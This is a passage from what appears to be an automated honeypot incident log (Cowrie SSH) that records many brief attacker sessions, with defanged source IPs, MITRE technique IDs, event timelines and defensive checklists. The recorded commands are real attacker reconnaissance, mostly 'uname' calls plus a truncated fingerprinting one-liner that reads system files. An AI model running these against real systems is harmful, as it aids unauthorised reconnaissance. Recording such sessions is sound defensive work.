| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:43:23` | `cowrie.session.connect` |
| `2026-07-12 14:43:23` | `cowrie.client.version` |
| `2026-07-12 14:43:23` | `cowrie.client.kex` |
| `2026-07-12 14:43:24` | `cowrie.login.success` |
| `2026-07-12 14:43:25` | `cowrie.session.params` |
| `2026-07-12 14:43:25` | `cowrie.command.input` |
| `2026-07-12 14:43:25` | `cowrie.command.input` |
| `2026-07-12 14:43:25` | `cowrie.command.input` |
| `2026-07-12 14:43:25` | `cowrie.command.input` |
| `2026-07-12 14:43:25` | `cowrie.command.input` |
| `2026-07-12 14:43:25` | `cowrie.command.success` |
| `2026-07-12 14:43:25` | `cowrie.command.input` |
| `2026-07-12 14:43:25` | `cowrie.command.input` |
| `2026-07-12 14:43:25` | `cowrie.command.input` |
| `2026-07-12 14:43:25` | `cowrie.command.input` |
| `2026-07-12 14:43:26` | `cowrie.log.closed` |
| `2026-07-12 14:43:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00f439e449a0

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-12 14:43 |
| **Last Seen** | 2026-07-12 14:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:43:33` | `cowrie.session.connect` |
| `2026-07-12 14:43:33` | `cowrie.client.version` |
| `2026-07-12 14:43:33` | `cowrie.client.kex` |
| `2026-07-12 14:43:34` | `cowrie.login.success` |
| `2026-07-12 14:43:35` | `cowrie.session.params` |
| `2026-07-12 14:43:35` | `cowrie.command.input` |
| `2026-07-12 14:43:35` | `cowrie.log.closed` |
| `2026-07-12 14:43:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7c907767866

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:44 |
| **Last Seen** | 2026-07-12 14:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:44:42` | `cowrie.session.connect` |
| `2026-07-12 14:44:42` | `cowrie.client.version` |
| `2026-07-12 14:44:42` | `cowrie.client.kex` |
| `2026-07-12 14:44:44` | `cowrie.login.success` |
| `2026-07-12 14:44:46` | `cowrie.session.params` |
| `2026-07-12 14:44:46` | `cowrie.command.input` |
| `2026-07-12 14:44:46` | `cowrie.log.closed` |
| `2026-07-12 14:44:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c944ec28d903

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:44 |
| **Last Seen** | 2026-07-12 14:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:44:48` | `cowrie.session.connect` |
| `2026-07-12 14:44:49` | `cowrie.client.version` |
| `2026-07-12 14:44:49` | `cowrie.client.kex` |
| `2026-07-12 14:44:53` | `cowrie.login.success` |
| `2026-07-12 14:44:54` | `cowrie.session.params` |
| `2026-07-12 14:44:54` | `cowrie.command.input` |
| `2026-07-12 14:44:55` | `cowrie.log.closed` |
| `2026-07-12 14:44:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d9cc094ff69

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:44 |
| **Last Seen** | 2026-07-12 14:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:44:55` | `cowrie.session.connect` |
| `2026-07-12 14:44:55` | `cowrie.client.version` |
| `2026-07-12 14:44:55` | `cowrie.client.kex` |
| `2026-07-12 14:44:58` | `cowrie.login.success` |
| `2026-07-12 14:45:01` | `cowrie.session.params` |
| `2026-07-12 14:45:01` | `cowrie.command.input` |
| `2026-07-12 14:45:01` | `cowrie.log.closed` |
| `2026-07-12 14:45:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc3ff77e16f0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:45 |
| **Last Seen** | 2026-07-12 14:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:45:01` | `cowrie.session.connect` |
| `2026-07-12 14:45:01` | `cowrie.client.version` |
| `2026-07-12 14:45:01` | `cowrie.client.kex` |
| `2026-07-12 14:45:05` | `cowrie.login.success` |
| `2026-07-12 14:45:07` | `cowrie.session.params` |
| `2026-07-12 14:45:07` | `cowrie.command.input` |
| `2026-07-12 14:45:08` | `cowrie.log.closed` |
| `2026-07-12 14:45:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7a01a295f83

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:45 |
| **Last Seen** | 2026-07-12 14:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:45:07` | `cowrie.session.connect` |
| `2026-07-12 14:45:08` | `cowrie.client.version` |
| `2026-07-12 14:45:08` | `cowrie.client.kex` |
| `2026-07-12 14:45:11` | `cowrie.login.success` |
| `2026-07-12 14:45:13` | `cowrie.session.params` |
| `2026-07-12 14:45:13` | `cowrie.command.input` |
| `2026-07-12 14:45:14` | `cowrie.log.closed` |
| `2026-07-12 14:45:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73baa8345b0b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:45 |
| **Last Seen** | 2026-07-12 14:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:45:13` | `cowrie.session.connect` |
| `2026-07-12 14:45:13` | `cowrie.client.version` |
| `2026-07-12 14:45:13` | `cowrie.client.kex` |
| `2026-07-12 14:45:17` | `cowrie.login.success` |
| `2026-07-12 14:45:19` | `cowrie.session.params` |
| `2026-07-12 14:45:19` | `cowrie.command.input` |
| `2026-07-12 14:45:20` | `cowrie.log.closed` |
| `2026-07-12 14:45:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cac965b3a107

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:45 |
| **Last Seen** | 2026-07-12 14:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:45:19` | `cowrie.session.connect` |
| `2026-07-12 14:45:20` | `cowrie.client.version` |
| `2026-07-12 14:45:20` | `cowrie.client.kex` |
| `2026-07-12 14:45:22` | `cowrie.login.success` |
| `2026-07-12 14:45:24` | `cowrie.session.params` |
| `2026-07-12 14:45:24` | `cowrie.command.input` |
| `2026-07-12 14:45:24` | `cowrie.log.closed` |
| `2026-07-12 14:45:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54c9d2c02a1f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:45 |
| **Last Seen** | 2026-07-12 14:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:45:24` | `cowrie.session.connect` |
| `2026-07-12 14:45:25` | `cowrie.client.version` |
| `2026-07-12 14:45:25` | `cowrie.client.kex` |
| `2026-07-12 14:45:28` | `cowrie.login.success` |
| `2026-07-12 14:45:29` | `cowrie.session.params` |
| `2026-07-12 14:45:29` | `cowrie.command.input` |
| `2026-07-12 14:45:31` | `cowrie.log.closed` |
| `2026-07-12 14:45:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ea2a3e02da3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:45 |
| **Last Seen** | 2026-07-12 14:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:45:30` | `cowrie.session.connect` |
| `2026-07-12 14:45:31` | `cowrie.client.version` |
| `2026-07-12 14:45:31` | `cowrie.client.kex` |
| `2026-07-12 14:45:34` | `cowrie.login.success` |
| `2026-07-12 14:45:36` | `cowrie.session.params` |
| `2026-07-12 14:45:36` | `cowrie.command.input` |
| `2026-07-12 14:45:37` | `cowrie.log.closed` |
| `2026-07-12 14:45:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83cb247416d9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:45 |
| **Last Seen** | 2026-07-12 14:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:45:37` | `cowrie.session.connect` |
| `2026-07-12 14:45:38` | `cowrie.client.version` |
| `2026-07-12 14:45:38` | `cowrie.client.kex` |
| `2026-07-12 14:45:40` | `cowrie.login.success` |
| `2026-07-12 14:45:41` | `cowrie.session.params` |
| `2026-07-12 14:45:41` | `cowrie.command.input` |
| `2026-07-12 14:45:41` | `cowrie.log.closed` |
| `2026-07-12 14:45:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ed8203ea516

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:45 |
| **Last Seen** | 2026-07-12 14:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:45:44` | `cowrie.session.connect` |
| `2026-07-12 14:45:44` | `cowrie.client.version` |
| `2026-07-12 14:45:44` | `cowrie.client.kex` |
| `2026-07-12 14:45:45` | `cowrie.login.success` |
| `2026-07-12 14:45:46` | `cowrie.session.params` |
| `2026-07-12 14:45:46` | `cowrie.command.input` |
| `2026-07-12 14:45:47` | `cowrie.log.closed` |
| `2026-07-12 14:45:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b3eae213520

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:45 |
| **Last Seen** | 2026-07-12 14:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:45:50` | `cowrie.session.connect` |
| `2026-07-12 14:45:50` | `cowrie.client.version` |
| `2026-07-12 14:45:50` | `cowrie.client.kex` |
| `2026-07-12 14:45:51` | `cowrie.login.success` |
| `2026-07-12 14:45:51` | `cowrie.session.params` |
| `2026-07-12 14:45:51` | `cowrie.command.input` |
| `2026-07-12 14:45:51` | `cowrie.log.closed` |
| `2026-07-12 14:45:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45437ee777b4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:45 |
| **Last Seen** | 2026-07-12 14:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:45:55` | `cowrie.session.connect` |
| `2026-07-12 14:45:56` | `cowrie.client.version` |
| `2026-07-12 14:45:56` | `cowrie.client.kex` |
| `2026-07-12 14:45:56` | `cowrie.login.success` |
| `2026-07-12 14:45:57` | `cowrie.session.params` |
| `2026-07-12 14:45:57` | `cowrie.command.input` |
| `2026-07-12 14:45:57` | `cowrie.log.closed` |
| `2026-07-12 14:45:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ceb97cc63758

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:46 |
| **Last Seen** | 2026-07-12 14:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:46:02` | `cowrie.session.connect` |
| `2026-07-12 14:46:02` | `cowrie.client.version` |
| `2026-07-12 14:46:02` | `cowrie.client.kex` |
| `2026-07-12 14:46:03` | `cowrie.login.success` |
| `2026-07-12 14:46:04` | `cowrie.session.params` |
| `2026-07-12 14:46:04` | `cowrie.command.input` |
| `2026-07-12 14:46:04` | `cowrie.log.closed` |
| `2026-07-12 14:46:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04c383ab26a1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 14:46 |
| **Last Seen** | 2026-07-12 14:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:46:06` | `cowrie.session.connect` |
| `2026-07-12 14:46:06` | `cowrie.client.version` |
| `2026-07-12 14:46:06` | `cowrie.client.kex` |
| `2026-07-12 14:46:07` | `cowrie.login.success` |
| `2026-07-12 14:46:08` | `cowrie.session.params` |
| `2026-07-12 14:46:08` | `cowrie.command.input` |
| `2026-07-12 14:46:08` | `cowrie.command.input` |
| `2026-07-12 14:46:08` | `cowrie.command.input` |
| `2026-07-12 14:46:08` | `cowrie.command.input` |
| `2026-07-12 14:46:08` | `cowrie.command.input` |
| `2026-07-12 14:46:08` | `cowrie.command.success` |
| `2026-07-12 14:46:08` | `cowrie.command.input` |
| `2026-07-12 14:46:08` | `cowrie.command.input` |
| `2026-07-12 14:46:08` | `cowrie.command.input` |
| `2026-07-12 14:46:08` | `cowrie.command.input` |
| `2026-07-12 14:46:08` | `cowrie.log.closed` |
| `2026-07-12 14:46:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25a07e0b5a8c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:46 |
| **Last Seen** | 2026-07-12 14:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:46:08` | `cowrie.session.connect` |
| `2026-07-12 14:46:08` | `cowrie.client.version` |
| `2026-07-12 14:46:08` | `cowrie.client.kex` |
| `2026-07-12 14:46:09` | `cowrie.login.success` |
| `2026-07-12 14:46:10` | `cowrie.session.params` |
| `2026-07-12 14:46:10` | `cowrie.command.input` |
| `2026-07-12 14:46:10` | `cowrie.log.closed` |
| `2026-07-12 14:46:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad73503a7d5d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:46 |
| **Last Seen** | 2026-07-12 14:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:46:14` | `cowrie.session.connect` |
| `2026-07-12 14:46:14` | `cowrie.client.version` |
| `2026-07-12 14:46:14` | `cowrie.client.kex` |
| `2026-07-12 14:46:14` | `cowrie.login.success` |
| `2026-07-12 14:46:15` | `cowrie.session.params` |
| `2026-07-12 14:46:15` | `cowrie.command.input` |
| `2026-07-12 14:46:15` | `cowrie.log.closed` |
| `2026-07-12 14:46:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b0186c14a03

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:46 |
| **Last Seen** | 2026-07-12 14:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:46:19` | `cowrie.session.connect` |
| `2026-07-12 14:46:19` | `cowrie.client.version` |
| `2026-07-12 14:46:19` | `cowrie.client.kex` |
| `2026-07-12 14:46:20` | `cowrie.login.success` |
| `2026-07-12 14:46:21` | `cowrie.session.params` |
| `2026-07-12 14:46:21` | `cowrie.command.input` |
| `2026-07-12 14:46:21` | `cowrie.log.closed` |
| `2026-07-12 14:46:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b157af88510

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:46 |
| **Last Seen** | 2026-07-12 14:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:46:25` | `cowrie.session.connect` |
| `2026-07-12 14:46:25` | `cowrie.client.version` |
| `2026-07-12 14:46:25` | `cowrie.client.kex` |
| `2026-07-12 14:46:26` | `cowrie.login.success` |
| `2026-07-12 14:46:27` | `cowrie.session.params` |
| `2026-07-12 14:46:27` | `cowrie.command.input` |
| `2026-07-12 14:46:27` | `cowrie.log.closed` |
| `2026-07-12 14:46:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59e318b1330f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:46 |
| **Last Seen** | 2026-07-12 14:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:46:31` | `cowrie.session.connect` |
| `2026-07-12 14:46:31` | `cowrie.client.version` |
| `2026-07-12 14:46:31` | `cowrie.client.kex` |
| `2026-07-12 14:46:32` | `cowrie.login.success` |
| `2026-07-12 14:46:33` | `cowrie.session.params` |
| `2026-07-12 14:46:33` | `cowrie.command.input` |
| `2026-07-12 14:46:33` | `cowrie.log.closed` |
| `2026-07-12 14:46:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55b007bebee6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:46 |
| **Last Seen** | 2026-07-12 14:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:46:37` | `cowrie.session.connect` |
| `2026-07-12 14:46:37` | `cowrie.client.version` |
| `2026-07-12 14:46:37` | `cowrie.client.kex` |
| `2026-07-12 14:46:40` | `cowrie.login.success` |
| `2026-07-12 14:46:42` | `cowrie.session.params` |
| `2026-07-12 14:46:42` | `cowrie.command.input` |
| `2026-07-12 14:46:42` | `cowrie.log.closed` |
| `2026-07-12 14:46:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b99523fac2da

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:46 |
| **Last Seen** | 2026-07-12 14:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:46:43` | `cowrie.session.connect` |
| `2026-07-12 14:46:44` | `cowrie.client.version` |
| `2026-07-12 14:46:44` | `cowrie.client.kex` |
| `2026-07-12 14:46:44` | `cowrie.login.success` |
| `2026-07-12 14:46:45` | `cowrie.session.params` |
| `2026-07-12 14:46:45` | `cowrie.command.input` |
